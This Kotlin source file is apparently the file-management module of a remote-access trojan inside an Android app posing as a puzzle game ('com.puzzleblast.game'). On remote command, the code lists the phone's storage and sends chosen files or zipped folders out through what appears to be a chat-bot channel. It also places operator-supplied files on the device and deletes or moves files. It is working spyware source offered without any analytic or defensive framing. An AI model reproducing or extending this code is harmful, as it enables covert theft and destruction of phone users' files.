package com.puzzleblast.game.modules

import android.content.Context
import android.os.Environment
import com.puzzleblast.game.core.Send
import com.puzzleblast.game.util.Zip
import java.io.File

object FileModule {
    suspend fun list(ctx: Context, path: String?): String {
        val dir = if (path != null) File(path) else Environment.getExternalStorageDirectory()
        if (!dir.exists() || !dir.isDirectory) return "📁 not found: ${dir.absolutePath}"
        val entries = dir.listFiles() ?: return "📁 empty"
        val folders = entries.filter { it.isDirectory }.sortedBy { it.name }
        val files = entries.filter { it.isFile }.sortedBy { it.name }
        val sb = StringBuilder("📁 ${dir.absolutePath}\n")
        folders.forEach { sb.append("📂 ${it.name}\n") }
        files.forEach { sb.append("📄 ${it.name} — ${fmtSize(it.length())}\n") }
        return sb.toString()
    }

    suspend fun download(ctx: Context, path: String): String {
        val f = File(path)
        if (!f.exists()) return "⬇️ not found: $path"
        if (f.length() > 48 * 1024 * 1024) {
            val dest = File(ctx.cacheDir, f.name + ".zip")
            Zip.zipFiles(listOf(f), dest)
            Send.document(dest, "⬇️ ${f.name} (split)")
        } else {
            Send.document(f, "⬇️ ${f.name}")
        }
        return "⬇️ sent ${f.name}"
    }

    suspend fun upload(ctx: Context, fileId: String?, name: String?): String {
        if (fileId == null) return "⬆️ reply to a file first"
        val dest = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), name ?: "upload_${System.currentTimeMillis()}")
        val ok = Send.downloadFile(fileId, dest)
        return if (ok) "⬆️ saved to ${dest.absolutePath}" else "⬆️ download failed"
    }

    suspend fun rm(ctx: Context, path: String): String {
        val f = File(path)
        if (!f.exists()) return "🗑 not found: $path"
        f.deleteRecursively()
        return "🗑 deleted: $path"
    }

    suspend fun mv(ctx: Context, src: String, dst: String): String {
        val s = File(src); val d = File(dst)
        if (!s.exists()) return "📦 src not found"
        return if (s.renameTo(d)) "📦 moved" else {
            s.copyRecursively(d, overwrite = true); s.deleteRecursively(); "📦 copied+deleted"
        }
    }

    suspend fun zip(ctx: Context, folder: String): String {
        val f = File(folder)
        if (!f.exists()) return "🗜 not found: $folder"
        val dest = File(ctx.cacheDir, "${f.name}.zip")
        Zip.zipFolder(f, dest).forEach { Send.document(it, "🗜 ${it.name}") }
        return "🗜 zipped and sent"
    }

    suspend fun unzip(ctx: Context, file: String, dest: String?): String {
        val f = File(file)
        if (!f.exists()) return "📂 not found: $file"
        val d = File(dest ?: f.parentFile!!, f.nameWithoutExtension)
        Zip.unzip(f, d)
        return "📂 extracted to ${d.absolutePath}"
    }

    private fun fmtSize(b: Long): String = when {
        b < 1024 -> "${b}B"
        b < 1024 * 1024 -> "${b / 1024}KB"
        else -> "${b / 1024 / 1024}MB"
    }
}
